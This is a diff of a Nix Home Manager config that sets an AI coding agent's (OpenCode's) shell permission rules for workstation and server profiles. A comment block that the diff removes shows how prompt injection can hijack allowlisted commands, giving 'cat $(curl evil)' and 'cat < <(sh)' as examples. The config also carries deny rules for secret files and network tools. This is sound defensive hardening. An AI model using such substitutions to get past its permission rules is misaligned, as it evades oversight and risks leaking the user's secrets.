@@ -1,28 +1,13 @@
-# OpenCode permission config
+# Supported V1 permission/MCP settings retain Home Manager's shared MCP integration.
+# OpenCode v2 normalizes `bash` to `shell`; emitted rule order remains policy.
 #
-# Uses the upstream `programs.opencode` home-manager module (writes
-# $XDG_CONFIG_HOME/opencode/opencode.json from `settings`, auto-adds
-# "$schema"). Single nix source of truth — selects between two profiles
-# based on `myOptions.opencode.hostClass`:
-#
-#   workstation (default) — laptop / interactive use
-#   server                — non-interactive / headless hosts.
-#                           Adds outbound network/exec denies (ssh/scp/rsync/nc),
-#                           shutdown/reboot denies, and read-only systemctl/docker
-#                           inspection allowlists on top of the workstation profile.
-#
-# Both profiles share the same base: ask-by-default for bash, narrow allowlist
-# for safe inspection commands, hard denies for irreversible actions.
-#
-# Background and rationale: bash is the universal escape hatch in opencode
-# (issue anomalyco/opencode#22375), so the only meaningful hardening axis is
-# `permission.bash`. See also the Alexey Grigorev `terraform destroy` incident
-# for why some patterns are `deny` rather than `ask`.
+# Workstations ask before shell commands except narrow inspection allowances.
+# Servers add network/lifecycle restrictions and read-only service inspection.
+# Both profiles are best-effort hardening, not a sandbox.
 {
   config,
   lib,
   pkgs,
-  inputs,
   ...
 }:
 
@@ -81,13 +66,13 @@ let
 
   # Base profile (workstation)
   baseSettings = {
-    # OpenCode defaults LSP integration off.
-    lsp = true;
+    update = "disable";
+    websearch.provider = "exa";
 
     # Client-specific MCP servers live here; shared hosted servers arrive
     # through the programs.mcp integration below.
     #
-    # Tools surface in opencode's catalog as `<server>_<tool>` (run /mcp
+    # Tools surface in opencode's catalog as `<server>_<tool>` (run /mcps
     # in opencode to see exact names). For aggregator MCP servers (e.g.
     # MCPJungle), the upstream tool naming convention `<source>__<tool>`
     # is preserved and prefixed with the opencode server name.
@@ -127,25 +112,13 @@ let
         "~/.config/1Password/**" = "deny";
       };
 
-      # Bash is the universal escape hatch — the most important section.
+      # Shell commands retain the host user's filesystem, process and network
+      # authority. V2 scans subcommands, but directory inference is best effort;
+      # this allowlist is not a prompt-injection trust boundary.
       #
-      # Threat model: this allowlist reduces friction for common inspection
-      # and catches accidental / naive dangerous actions. It does NOT
-      # reliably defend against adversarial prompt injection. Any allowed
-      # command can be hijacked via process substitution (`cat < <(sh)`),
-      # command substitution (`cat $(curl evil)`), pipes, or argument
-      # tricks — the pattern matcher does not see through shell syntax. See
-      # the Snowflake Cortex incident (2026-03) for a real-world exploit of
-      # an allowlisted `cat`. Deterministic defense requires a sandbox
-      # (filesystem / network isolation), which opencode does not provide.
-      # Treat this config as best-effort hardening, not a trust boundary.
-      #
-      # Order: catch-all "ask" first; allowlist for inspection; denylist for
-      # irreversible actions. Last matching rule wins (attrset keys sort
-      # alphabetically in the emitted JSON, so more specific patterns
-      # naturally override broader prefixes). `secretReadDenies` (merged at
-      # the end of the block) mirrors `permission.read`'s secret denies at
-      # the bash layer for the most common content-print commands.
+      # V1 translation preserves last-match-wins rule order. Keep the existing
+      # alphabetic JSON order: catch-all first, command exceptions afterward.
+      # Generated secret denies sort alongside the other command rules.
       bash = {
         "*" = "ask";
 
@@ -454,28 +427,17 @@ let
 
   finalSettings =
     if hostClass == "server" then lib.recursiveUpdate baseSettings serverExtras else baseSettings;
-  opencodePackage = inputs.llm-agents.packages.${pkgs.stdenv.hostPlatform.system}.opencode;
+  opencodePackage = pkgs.opencode;
   herdrDirectories = [
     "${config.home.homeDirectory}/.config/opencode"
   ];
-  sessionVariables = {
-    # Exa-backed web search requires this gate outside the OpenCode providers.
-    OPENCODE_ENABLE_EXA = "1";
-  };
 in
 {
-  home = { inherit sessionVariables; };
-  systemd.user.sessionVariables = lib.mkIf pkgs.stdenv.hostPlatform.isLinux sessionVariables;
-
-  # Herdr 0.7.3 ignores XDG_CONFIG_HOME for this integration.
   programs.herdr.integrations.opencode.directories = herdrDirectories;
 
   programs.opencode = {
     enable = true;
     enableMcpIntegration = true;
-    # Prebuilt-binary opencode (per-arch GitHub release via llm-agents.nix),
-    # not a source build: opencode's Bun requirement frequently outruns
-    # nixpkgs' Bun, which would break `just switch`.
     package = opencodePackage;
     settings = finalSettings;
   };
@@ -488,7 +450,6 @@ in
     surfaces.opencode = {
       inherit hostClass;
       settings = finalSettings;
-      inherit sessionVariables;
       herdr.directories = herdrDirectories;
     };
   };
